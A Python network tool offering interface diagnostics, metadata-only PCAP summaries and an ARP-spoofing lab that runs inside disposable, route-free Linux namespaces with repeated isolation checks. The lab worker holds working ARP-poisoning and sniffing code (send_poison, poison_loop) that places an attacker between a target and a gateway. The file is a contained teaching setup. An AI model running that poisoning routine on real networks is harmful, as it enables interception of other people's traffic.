#!/usr/bin/env python3
"""MIMic: local network diagnostics, offline PCAP metadata, and an isolated ARP lab.

The live ARP demonstration is available only through ``--lab``. It creates a
disposable Linux network namespace topology with no physical network link or
external route, then removes it on exit. Application payloads are not inspected
or retained. Use only on systems and networks you are authorized to administer.
"""

import argparse
import collections
import json
import os
import platform
import secrets
import select
import shutil
import signal
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

try:
    from scapy.all import (
        ARP, DNS, Ether, ICMP, IP, TCP, UDP, get_if_list, get_if_hwaddr,
        sendp, sniff, srp,
    )
    from scapy.error import Scapy_Exception
    from scapy.utils import PcapReader
    SCAPY_AVAILABLE = True
    SCAPY_IMPORT_ERROR = None
except ImportError as exc:
    ARP = DNS = Ether = ICMP = IP = TCP = UDP = None
    get_if_list = get_if_hwaddr = sendp = sniff = srp = PcapReader = None
    Scapy_Exception = Exception
    SCAPY_AVAILABLE = False
    SCAPY_IMPORT_ERROR = exc
except Exception as exc:
    # Scapy initializes Linux interfaces at import time. In restricted
    # containers, netlink access can fail even when Scapy is installed.
    ARP = DNS = Ether = ICMP = IP = TCP = UDP = None
    get_if_list = get_if_hwaddr = sendp = sniff = srp = PcapReader = None
    Scapy_Exception = Exception
    SCAPY_AVAILABLE = False
    SCAPY_IMPORT_ERROR = exc


LAB_TARGET_IP = "198.18.0.2"
LAB_GATEWAY_IP = "198.18.0.1"
def require_scapy():
    if not SCAPY_AVAILABLE:
        if isinstance(SCAPY_IMPORT_ERROR, ImportError):
            message = "Scapy is required for this mode. Install it with: python -m pip install scapy"
        else:
            message = "Scapy could not access this environment's network interfaces: {}".format(SCAPY_IMPORT_ERROR)
        raise RuntimeError(message) from SCAPY_IMPORT_ERROR


def run_command(command, check=True, timeout=10):
    """Run a command without a shell and return its completed process."""
    result = subprocess.run(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        universal_newlines=True, timeout=timeout,
    )
    if check and result.returncode:
        detail = result.stderr.strip() or result.stdout.strip() or "command failed"
        raise RuntimeError("{}: {}".format(" ".join(command), detail))
    return result


def is_admin():
    if hasattr(os, "geteuid"):
        return os.geteuid() == 0
    if platform.system() == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except (ImportError, AttributeError, OSError):
            return False
    return False


def interface_diagnostics():
    """Return interface and default-route metadata without changing the host."""
    interfaces = []
    default_route = None
    route_status = "unavailable"
    notes = []

    if platform.system() == "Linux" and shutil.which("ip"):
        try:
            result = run_command(["ip", "-j", "addr", "show"])
            for item in json.loads(result.stdout):
                addresses = []
                for info in item.get("addr_info", []):
                    if info.get("family") in ("inet", "inet6"):
                        addresses.append(info.get("local"))
                interfaces.append({
                    "name": item.get("ifname"),
                    "state": item.get("operstate", "unknown"),
                    "addresses": addresses,
                })
            routes = json.loads(run_command(["ip", "-j", "route", "show", "default"]).stdout)
            route_status = "found" if routes else "none"
            if routes:
                default_route = routes[0]
        except (RuntimeError, ValueError, OSError) as exc:
            notes.append("Linux interface/route details unavailable: {}".format(exc))
    if not interfaces:
        try:
            for _, name in socket.if_nameindex():
                interfaces.append({"name": name, "addresses": []})
        except OSError as exc:
            notes.append("Interface enumeration unavailable: {}".format(exc))

    if SCAPY_AVAILABLE:
        try:
            scapy_interfaces = sorted(set(get_if_list()))
            known = {item.get("name") for item in interfaces}
            for name in scapy_interfaces:
                if name not in known:
                    interfaces.append({"name": name, "addresses": []})
        except Exception:
            pass

    return {
        "platform": platform.platform(),
        "administrator": is_admin(),
        "scapy_available": SCAPY_AVAILABLE,
        "scapy_error": str(SCAPY_IMPORT_ERROR) if SCAPY_IMPORT_ERROR else None,
        "interfaces": interfaces,
        "default_route": default_route,
        "default_route_status": route_status,
        "notes": notes,
    }


def classify_packet(packet):
    if packet.haslayer(DNS):
        return "DNS"
    if packet.haslayer(TCP):
        return "TCP"
    if packet.haslayer(UDP):
        return "UDP"
    if packet.haslayer(ICMP):
        return "ICMP"
    if packet.haslayer(ARP):
        return "ARP"
    if packet.haslayer(IP):
        return "IP"
    return "Other"


def packet_metadata(packet):
    """Extract headers only. Never return raw/application payload bytes."""
    info = {
        "protocol": classify_packet(packet),
        "bytes": len(packet),
    }
    if packet.haslayer(IP):
        ip = packet[IP]
        info["src"] = ip.src
        info["dst"] = ip.dst
        if packet.haslayer(TCP):
            info["sport"] = int(packet[TCP].sport)
            info["dport"] = int(packet[TCP].dport)
        elif packet.haslayer(UDP):
            info["sport"] = int(packet[UDP].sport)
            info["dport"] = int(packet[UDP].dport)
    if packet.haslayer(DNS):
        dns = packet[DNS]
        if dns.qr == 0 and dns.qd:
            name = dns.qd.qname
            if isinstance(name, bytes):
                name = name.decode("utf-8", errors="replace")
            info["dns_query"] = str(name).rstrip(".")
    return info


def analyze_pcap(filename, max_packets=1000000):
    require_scapy()
    counts = collections.Counter()
    dns_queries = collections.Counter()
    flows = {}
    packet_count = 0
    byte_count = 0

    try:
        reader = PcapReader(str(filename))
    except (OSError, ValueError, Scapy_Exception) as exc:
        raise RuntimeError("Cannot read PCAP '{}': {}".format(filename, exc))

    try:
        for packet in reader:
            if packet_count >= max_packets:
                raise RuntimeError(
                    "PCAP exceeds the packet limit ({:,}); raise --max-packets to continue.".format(max_packets)
                )
            packet_count += 1
            meta = packet_metadata(packet)
            byte_count += meta["bytes"]
            counts[meta["protocol"]] += 1
            if "dns_query" in meta:
                dns_queries[meta["dns_query"]] += 1
            if "src" in meta:
                key = (meta["src"], meta["dst"], meta.get("sport", 0), meta.get("dport", 0), meta["protocol"])
                if key not in flows:
                    flows[key] = {"packets": 0, "bytes": 0}
                flows[key]["packets"] += 1
                flows[key]["bytes"] += meta["bytes"]
    finally:
        reader.close()

    top_flows = sorted(
        flows.items(), key=lambda item: (item[1]["packets"], item[1]["bytes"]), reverse=True
    )[:20]
    return {
        "file": str(Path(filename).resolve()),
        "packets": packet_count,
        "bytes": byte_count,
        "protocols": dict(counts.most_common()),
        "dns_queries": [
            {"name": name, "count": count}
            for name, count in dns_queries.most_common(50)
        ],
        "top_flows": [
            {
                "src": key[0], "dst": key[1], "sport": key[2], "dport": key[3],
                "protocol": key[4], **stats,
            }
            for key, stats in top_flows
        ],
        "payloads_decoded_or_saved": False,
    }


class LabTopology:
    """Creates an isolated bridge and three disposable network namespaces."""

    def __init__(self):
        suffix = secrets.token_hex(3)
        self.bridge = "mbr" + suffix
        self.attacker = "mimic-a-" + suffix
        self.target = "mimic-t-" + suffix
        self.gateway = "mimic-g-" + suffix
        self.host_links = ["mh0" + suffix, "mh1" + suffix, "mh2" + suffix]
        self.namespaces = [self.attacker, self.target, self.gateway]
        self.created_bridge = False
        self.created_namespaces = []
        self.created_host_links = []
        self.ip = shutil.which("ip")
        if not self.ip:
            raise RuntimeError("Linux iproute2 ('ip') is required for --lab.")

    def _ip(self, *args, check=True):
        return run_command([self.ip] + list(args), check=check)

    def create(self):
        if platform.system() != "Linux":
            raise RuntimeError("The live isolated lab is available on Linux only.")
        if not is_admin():
            raise RuntimeError("--lab requires root privileges to create disposable network namespaces.")
        require_scapy()

        try:
            for namespace in self.namespaces:
                self._ip("netns", "add", namespace)
                self.created_namespaces.append(namespace)

            self._ip("link", "add", self.bridge, "type", "bridge")
            self.created_bridge = True
            self._ip("link", "set", self.bridge, "up")

            namespace_ips = ["198.18.0.3/24", LAB_TARGET_IP + "/24", LAB_GATEWAY_IP + "/24"]
            for namespace, host_link, address in zip(self.namespaces, self.host_links, namespace_ips):
                peer = "mp" + secrets.token_hex(3)
                self._ip("link", "add", host_link, "type", "veth", "peer", "name", peer)
                self.created_host_links.append(host_link)
                self._ip("link", "set", peer, "netns", namespace)
                self._ip("link", "set", host_link, "master", self.bridge)
                self._ip("link", "set", host_link, "up")
                self._ip("-n", namespace, "link", "set", peer, "name", "eth0")
                self._ip("-n", namespace, "link", "set", "lo", "up")
                self._ip("-n", namespace, "addr", "add", address, "dev", "eth0")
                self._ip("-n", namespace, "link", "set", "eth0", "up")

            self._verify_isolation()
            self._ip("netns", "exec", self.attacker, "sysctl", "-q", "-w", "net.ipv4.ip_forward=1")
            self._ip("netns", "exec", self.attacker, "sysctl", "-q", "-w", "net.ipv4.conf.all.rp_filter=0")
            self._ip("netns", "exec", self.attacker, "sysctl", "-q", "-w", "net.ipv4.conf.eth0.rp_filter=0")
        except Exception:
            self.cleanup()
            raise

    def _verify_isolation(self):
        bridge_ports = json.loads(self._ip("-j", "link", "show", "master", self.bridge).stdout)
        expected_ports = set(self.host_links)
        actual_ports = {item.get("ifname") for item in bridge_ports}
        if actual_ports != expected_ports:
            raise RuntimeError("Lab bridge has unexpected ports; refusing to run ARP traffic.")

        for namespace, expected_ip in zip(
            self.namespaces, ["198.18.0.3", "198.18.0.2", "198.18.0.1"]
        ):
            links = json.loads(self._ip("-n", namespace, "-j", "link", "show").stdout)
            if {item.get("ifname") for item in links} != {"lo", "eth0"}:
                raise RuntimeError("Unexpected interface in lab namespace {}; refusing to continue.".format(namespace))
            routes = json.loads(self._ip("-n", namespace, "-j", "route", "show").stdout)
            if any(route.get("dst") == "default" for route in routes):
                raise RuntimeError("A lab namespace has an external route; refusing to continue.")
            addresses = json.loads(self._ip("-n", namespace, "-j", "addr", "show", "dev", "eth0").stdout)
            found = {
                item.get("local") for link in addresses
                for item in link.get("addr_info", []) if item.get("family") == "inet"
            }
            if found != {expected_ip}:
                raise RuntimeError("Unexpected address in lab namespace {}; refusing to continue.".format(namespace))

    def verify_arp_restored(self, target_mac, gateway_mac):
        checks = [
            (self.target, LAB_GATEWAY_IP, gateway_mac.lower()),
            (self.gateway, LAB_TARGET_IP, target_mac.lower()),
        ]
        for namespace, address, expected_mac in checks:
            result = self._ip("-n", namespace, "-j", "neigh", "show", "to", address, check=False)
            if result.returncode:
                return False
            try:
                neighbors = json.loads(result.stdout)
            except ValueError:
                return False
            if not any(item.get("lladdr", "").lower() == expected_mac for item in neighbors):
                return False
        return True

    def run_worker(self):
        """Start the private worker inside the freshly created attacker namespace."""
        script = str(Path(__file__).resolve())
        proc = subprocess.Popen(
            [self.ip, "netns", "exec", self.attacker, sys.executable, "-u", script,
             "--_lab-worker", "--_expected-namespace", str(os.stat(
                 "/var/run/netns/" + self.attacker
             ).st_ino)],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1,
        )
        try:
            ready, _, _ = select.select([proc.stdout], [], [], 10)
            if not ready:
                raise RuntimeError("The isolated ARP lab worker did not start in time.")
            line = proc.stdout.readline().strip()
            if not line.startswith("LAB_READY "):
                raise RuntimeError("The lab worker failed to start: " + (line or "no status received"))
            print("  Lab worker: {}".format(line[len("LAB_READY "):]))
            self.worker_macs = dict(
                part.split("=", 1) for part in line[len("LAB_READY "):].split()
                if "=" in part
            )
            return proc
        except Exception:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
            remaining = proc.stdout.read() if proc.stdout else ""
            if remaining.strip():
                print(remaining.rstrip())
            raise

    def generate_test_traffic(self):
        ping = shutil.which("ping")
        if not ping:
            raise RuntimeError("The Linux 'ping' utility is required to generate lab test traffic.")
        print("  Generating four ICMP echo requests from the target namespace...")
        result = self._ip(
            "netns", "exec", self.target, ping, "-n", "-c", "4", "-W", "1", LAB_GATEWAY_IP,
            check=False, timeout=10,
        )
        if result.stdout.strip():
            print(result.stdout.strip())
        if result.returncode:
            raise RuntimeError("Synthetic lab traffic did not complete successfully.")

    def cleanup(self):
        for namespace in reversed(self.created_namespaces):
            self._ip("netns", "del", namespace, check=False)
        self.created_namespaces = []
        for link in self.created_host_links:
            self._ip("link", "del", link, check=False)
        self.created_host_links = []
        if self.created_bridge:
            self._ip("link", "del", self.bridge, check=False)
            self.created_bridge = False


class LabMetadata:
    def __init__(self):
        self.packets = 0
        self.bytes = 0
        self.protocols = collections.Counter()
        self.flows = {}
        self.lock = threading.Lock()

    def process(self, packet):
        try:
            meta = packet_metadata(packet)
            with self.lock:
                self.packets += 1
                self.bytes += meta["bytes"]
                self.protocols[meta["protocol"]] += 1
                if "src" in meta:
                    key = (meta["src"], meta["dst"], meta.get("sport", 0), meta.get("dport", 0), meta["protocol"])
                    if key not in self.flows:
                        self.flows[key] = {"packets": 0, "bytes": 0}
                    self.flows[key]["packets"] += 1
                    self.flows[key]["bytes"] += meta["bytes"]
        except Exception:
            # A malformed packet is ignored; its contents are never logged.
            return

    def summary(self):
        with self.lock:
            flows = sorted(
                self.flows.items(), key=lambda item: (item[1]["packets"], item[1]["bytes"]), reverse=True
            )[:10]
            return {
                "packets": self.packets,
                "bytes": self.bytes,
                "protocols": dict(self.protocols.most_common()),
                "top_flows": [
                    {"src": key[0], "dst": key[1], "sport": key[2], "dport": key[3],
                     "protocol": key[4], **stats}
                    for key, stats in flows
                ],
                "payloads_decoded_or_saved": False,
            }


def validate_worker_namespace(expected_inode):
    if platform.system() != "Linux" or not hasattr(os, "geteuid") or os.geteuid() != 0:
        raise RuntimeError("Invalid lab worker context.")
    current_inode = os.stat("/proc/self/ns/net").st_ino
    if current_inode != expected_inode:
        raise RuntimeError("Lab worker is outside the namespace created by MIMic.")
    links = json.loads(run_command([shutil.which("ip") or "ip", "-j", "link", "show"]).stdout)
    if {item.get("ifname") for item in links} != {"lo", "eth0"}:
        raise RuntimeError("Lab worker sees an unexpected interface set; refusing ARP traffic.")
    routes = json.loads(run_command([shutil.which("ip") or "ip", "-j", "route", "show"]).stdout)
    if any(route.get("dst") == "default" for route in routes):
        raise RuntimeError("Lab worker sees an external route; refusing ARP traffic.")
    addrs = json.loads(run_command([shutil.which("ip") or "ip", "-j", "addr", "show", "dev", "eth0"]).stdout)
    actual = {
        item.get("local") for link in addrs for item in link.get("addr_info", [])
        if item.get("family") == "inet"
    }
    if actual != {"198.18.0.3"}:
        raise RuntimeError("Lab worker address check failed; refusing ARP traffic.")


def resolve_lab_mac(address):
    answer, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=address),
        iface="eth0", timeout=2, retry=1, verbose=False,
    )
    if not answer:
        raise RuntimeError("Could not resolve lab host {}.".format(address))
    return answer[0][1].hwsrc.lower()


def lab_worker(expected_inode):
    require_scapy()
    validate_worker_namespace(expected_inode)
    attacker_mac = get_if_hwaddr("eth0").lower()
    target_mac = resolve_lab_mac(LAB_TARGET_IP)
    gateway_mac = resolve_lab_mac(LAB_GATEWAY_IP)

    stop_event = threading.Event()
    for sig in (signal.SIGINT, signal.SIGTERM):
        signal.signal(sig, lambda _sig, _frame: stop_event.set())

    metadata = LabMetadata()
    capture_thread = threading.Thread(
        target=lambda: _capture_loop(metadata, stop_event), daemon=True,
    )
    capture_thread.start()

    def send_poison(destination_ip, destination_mac, claimed_ip):
        packet = Ether(dst=destination_mac) / ARP(
            op=2, pdst=destination_ip, hwdst=destination_mac,
            psrc=claimed_ip, hwsrc=attacker_mac,
        )
        sendp(packet, iface="eth0", verbose=False)

    def restore():
        for _ in range(4):
            sendp(
                Ether(dst=target_mac) / ARP(
                    op=2, pdst=LAB_TARGET_IP, hwdst=target_mac,
                    psrc=LAB_GATEWAY_IP, hwsrc=gateway_mac,
                ), iface="eth0", verbose=False,
            )
            sendp(
                Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=LAB_GATEWAY_IP, hwdst=gateway_mac,
                    psrc=LAB_TARGET_IP, hwsrc=target_mac,
                ), iface="eth0", verbose=False,
            )
            time.sleep(0.2)

    poison_thread = None
    try:
        print("LAB_READY attacker={} target={} gateway={}".format(attacker_mac, target_mac, gateway_mac), flush=True)

        def poison_loop():
            while not stop_event.is_set():
                send_poison(LAB_TARGET_IP, target_mac, LAB_GATEWAY_IP)
                send_poison(LAB_GATEWAY_IP, gateway_mac, LAB_TARGET_IP)
                stop_event.wait(1.0)

        poison_thread = threading.Thread(target=poison_loop, daemon=True)
        poison_thread.start()
        while not stop_event.wait(0.25):
            pass
    finally:
        stop_event.set()
        if poison_thread:
            poison_thread.join(timeout=2)
        try:
            restore()
        except Exception:
            pass
        capture_thread.join(timeout=2)
        print("LAB_SUMMARY " + json.dumps(metadata.summary(), sort_keys=True), flush=True)


def _capture_loop(metadata, stop_event):
    while not stop_event.is_set():
        try:
            sniff(iface="eth0", prn=metadata.process, store=False, timeout=0.5)
        except Exception:
            if not stop_event.is_set():
                time.sleep(0.25)


def run_lab():
    require_scapy()
    topology = LabTopology()
    worker = None
    previous_handlers = {}
    interrupted = threading.Event()

    def handle_signal(sig, _frame):
        interrupted.set()
        if worker and worker.poll() is None:
            worker.terminate()

    for sig in (signal.SIGINT, signal.SIGTERM):
        previous_handlers[sig] = signal.signal(sig, handle_signal)

    try:
        topology.create()
        print("MIMic isolated ARP lab")
        print("  Topology: attacker, target, and gateway share one isolated L2 segment")
        print("  Namespace addresses: attacker 198.18.0.3, target {}, gateway {}".format(
            LAB_TARGET_IP, LAB_GATEWAY_IP,
        ))
        print("  The lab has no physical NICs, uplinks, or default routes.")
        worker = topology.run_worker()
        # Allow the first poison announcements to populate the two test ARP caches.
        time.sleep(1.5)
        if not interrupted.is_set():
            topology.generate_test_traffic()
            time.sleep(0.5)
        if worker.poll() is None:
            worker.terminate()
            try:
                worker.wait(timeout=5)
            except subprocess.TimeoutExpired:
                worker.kill()
                worker.wait()
        output = worker.stdout.read() if worker.stdout else ""
        if output.strip():
            for line in output.splitlines():
                if line.startswith("LAB_SUMMARY "):
                    print("  Metadata summary: " + line[len("LAB_SUMMARY "):])
                else:
                    print("  " + line)
        if interrupted.is_set():
            print("Lab interrupted; cleanup completed.")
        else:
            restored = topology.verify_arp_restored(
                topology.worker_macs.get("target", ""),
                topology.worker_macs.get("gateway", ""),
            )
            if restored:
                print("Lab complete; ARP mappings were verified restored and the virtual network was removed.")
            else:
                print("Lab complete; the virtual network was removed, but ARP restoration could not be verified.")
    finally:
        if worker and worker.poll() is None:
            worker.terminate()
            try:
                worker.wait(timeout=3)
            except subprocess.TimeoutExpired:
                worker.kill()
                worker.wait()
        topology.cleanup()
        for sig, handler in previous_handlers.items():
            signal.signal(sig, handler)


def build_parser():
    parser = argparse.ArgumentParser(
        description="MIMic: local diagnostics, metadata-only PCAP analysis, and an isolated ARP lab.",
        epilog=(
            "Examples:\n"
            "  python main.py --diagnose\n"
            "  python main.py --analyze-pcap capture.pcap --json\n"
            "  sudo python main.py --lab\n\n"
            "Live ARP traffic is restricted to a disposable Linux namespace lab."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    modes = parser.add_mutually_exclusive_group(required=True)
    modes.add_argument("--diagnose", action="store_true", help="Show local interface and route metadata.")
    modes.add_argument("--analyze-pcap", metavar="FILE", help="Summarize a PCAP using packet metadata only.")
    modes.add_argument("--lab", action="store_true", help="Run a contained Linux ARP demonstration in disposable namespaces.")
    modes.add_argument("--_lab-worker", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--json", action="store_true", help="Print structured JSON output where applicable.")
    parser.add_argument("--max-packets", type=int, default=1000000,
                        help="Maximum packets to read from a PCAP (default: 1000000).")
    # Private hand-off used only by --lab after topology creation.
    parser.add_argument("--_expected-namespace", type=int, help=argparse.SUPPRESS)
    return parser


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.max_packets < 1:
        parser.error("--max-packets must be positive")
    try:
        if args._lab_worker:
            if args._expected_namespace is None:
                raise RuntimeError("Invalid private lab worker invocation.")
            lab_worker(args._expected_namespace)
        elif args.diagnose:
            result = interface_diagnostics()
            if args.json:
                print(json.dumps(result, indent=2, sort_keys=True))
            else:
                print("MIMic local network diagnostics")
                print("  Platform: {}".format(result["platform"]))
                print("  Administrator/root: {}".format("yes" if result["administrator"] else "no"))
                print("  Scapy: {}".format("available" if result["scapy_available"] else "unavailable"))
                if result["scapy_error"]:
                    print("  Scapy detail: {}".format(result["scapy_error"]))
                print("  Interfaces:")
                for item in result["interfaces"]:
                    if "error" in item:
                        print("    Error: {}".format(item["error"]))
                    else:
                        addresses = ", ".join(item.get("addresses", [])) or "no address found"
                        print("    {} [{}]: {}".format(item.get("name", "?"), item.get("state", "unknown"), addresses))
                route_text = json.dumps(result["default_route"]) if result["default_route"] else result["default_route_status"]
                print("  Default route: {}".format(route_text))
                for note in result.get("notes", []):
                    print("  Note: {}".format(note))
        elif args.analyze_pcap:
            result = analyze_pcap(args.analyze_pcap, args.max_packets)
            if args.json:
                print(json.dumps(result, indent=2, sort_keys=True))
            else:
                print("MIMic PCAP metadata summary")
                print("  File: {}".format(result["file"]))
                print("  Packets: {:,} | Bytes: {:,}".format(result["packets"], result["bytes"]))
                print("  Protocols:")
                for name, count in result["protocols"].items():
                    print("    {:<12} {:>8,}".format(name, count))
                if result["dns_queries"]:
                    print("  DNS queries:")
                    for item in result["dns_queries"]:
                        print("    {:>5}  {}".format(item["count"], item["name"]))
                if result["top_flows"]:
                    print("  Top flows:")
                    for flow in result["top_flows"]:
                        print("    {}:{} -> {}:{}  {} packets / {} bytes ({})".format(
                            flow["src"], flow["sport"], flow["dst"], flow["dport"],
                            flow["packets"], flow["bytes"], flow["protocol"],
                        ))
                print("  Payloads decoded or saved: no")
        elif args.lab:
            run_lab()
    except (RuntimeError, OSError, ValueError, subprocess.SubprocessError) as exc:
        print("MIMic: {}".format(exc), file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
